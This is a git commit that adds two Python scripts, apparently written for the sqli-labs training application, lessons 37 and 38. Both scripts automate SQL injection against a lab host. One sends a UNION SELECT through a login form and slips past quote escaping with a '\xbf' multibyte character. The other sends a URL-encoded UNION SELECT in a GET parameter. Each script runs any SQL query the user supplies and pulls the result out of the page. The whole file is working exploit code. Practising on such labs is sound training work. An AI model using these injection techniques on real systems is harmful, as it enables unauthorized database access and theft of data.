e3021c51d027a1d4b3cb2369adbacc6603d8760d
talvin3n <solamente12dios11sabe@gmail.com>
2018-01-01 22:30:23 +0900

    Add files via upload

---
+++ less37.py
@@ -0,0 +1,59 @@
+#!/usr/bin/env python
+
+import base64
+import requests
+import re
+import string
+import sys
+import time
+import urllib
+
+banner = '''
+USAGE: python %s <SQL Query>
+
+EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
+''' % (sys.argv[0], sys.argv[0])
+
+if(len(sys.argv) != 2):
+    print(banner)
+    exit(0)
+else:
+    pass
+
+sourcestr = string.printable
+url = "http://172.16.214.227/sqli-labs/Less-37/"
+pattern = r'Your Login name:[^<]+'
+query = "\xbf' union select (" + sys.argv[1] + "),3-- "
+result = ""
+
+header = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Accept-Encoding": "gzip, deflate",
+    "Connection": "close",
+}
+
+data = {
+    "uname": query,
+    "passwd": "test",
+    "submit": "Submit"
+}
+
+print("[*] Query: %s" % data)
+
+res = requests.post(url, headers=header, data=data, verify=False)
+resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
+resbody = re.sub(r"\\t", "\t", resbody)
+resbody = re.sub(r"\\r", "", resbody)
+resbody = re.sub(r"\\\'", "\'", resbody)
+resbody = re.sub(r"\\\"", "\"", resbody)
+resbody = re.sub(r"\\n", "\n", resbody).strip()
+
+try:
+    result = re.search(pattern, resbody).group(0).split(':')[1]
+except:
+    result = "***NO RESULT***"
+
+print("[*] RESULT: %s" % result)
---
+++ less38.py
@@ -0,0 +1,52 @@
+#!/usr/bin/env python
+
+import base64
+import requests
+import re
+import string
+import sys
+import time
+import urllib
+
+banner = '''
+USAGE: python %s <SQL Query>
+
+EXAMPLE: python %s "SELECT table_schema FROM information_schema.tables limit 0,1"
+''' % (sys.argv[0], sys.argv[0])
+
+if(len(sys.argv) != 2):
+    print(banner)
+    exit(0)
+else:
+    pass
+
+sourcestr = string.printable
+url = "http://172.16.214.227/sqli-labs/Less-38/?id="
+pattern = r'Your Username is[^<]+'
+query = "0%27%20union%20select%201%2C%28" + urllib.quote(sys.argv[1]) + "%29%2C%273"
+target = url + query
+result = ""
+
+header = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Connection": "close",
+}
+
+print("[*] Query: %s" % query)
+
+res = requests.get(target, headers=header, verify=False)
+resbody = str(res.text.encode('utf-8')).lstrip("b").strip("'")
+resbody = re.sub(r"\\t", "\t", resbody)
+resbody = re.sub(r"\\r", "", resbody)
+resbody = re.sub(r"\\\'", "\'", resbody)
+resbody = re.sub(r"\\\"", "\"", resbody)
+resbody = re.sub(r"\\n", "\n", resbody).strip()
+
+try:
+    result = re.search(pattern, resbody).group(0).split(':')[1].strip()
+except:
+    result = "***NO RESULT***"
+
+print("[*] RESULT: %s" % result)
